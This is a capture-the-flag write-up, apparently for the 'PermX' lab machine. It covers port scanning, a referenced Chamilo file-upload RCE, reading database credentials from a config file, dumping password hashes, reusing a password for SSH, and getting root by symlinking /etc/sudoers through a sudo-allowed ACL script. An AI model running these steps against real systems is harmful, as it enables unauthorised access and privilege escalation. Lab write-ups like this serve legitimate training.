## Port Scanning

```
# Nmap 7.94SVN scan initiated Sat Aug 31 15:16:00 2024 as: nmap -p 22,80,3922 -sV -sC -oA nmap/permx-detailed 10.10.11.23
Nmap scan report for 10.10.11.23
Host is up (0.046s latency).

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp   open   http       Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 (Ubuntu)
3922/tcp closed sor-update
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 31 15:16:11 2024 -- 1 IP address (1 host up) scanned in 10.32 seconds
```

---

## Port 80

Enumerate vhost and find `lms.permx.htb`
Enumerate `lms.permx.htb` dirs and find `/documentation` which leaks Chamilo version 1.11
Search for an exploit and find this https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc
Basically you have an unauthenticated arbitrary file upload which allows you to RCE
Run the exploit and get the foodhold

---

## User www-data

```
grep "3306" . -r 2>/dev/null | awk 'length <= 100'
```

We find db creds at `/var/www/chamilo/app/config/configuration.php`

```
// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;
```

This is a rabbit hole

```
MariaDB [chamilo]> select username,password,salt from user;
+----------+--------------------------------------------------------------+---------------------------------------------+
| username | password                                                     | salt                                        |
+----------+--------------------------------------------------------------+---------------------------------------------+
| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra | awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4 |
| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS | Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY |
+----------+--------------------------------------------------------------+---------------------------------------------+
```

Just login as mtz

```
mtz:03F6lY3uXAP2bkW8
```

---

## User mtz

```
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

Basically we can put rwx perm on any file under `/home/mtz` but actually you can work around this by creating a symlink

There are various ways to privesc (edit `/etc/passwd`, add a cronjob, edit sudoers)
We choose to edit `/etc/sudoers`

```
ln -s /etc/sudoers sudoers
sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
echo "mtz ALL=(ALL:ALL) NOPASSWD: /bin/bash" > /etc/sudoers
```

```
sudo /bin/bash
```

We are root

---
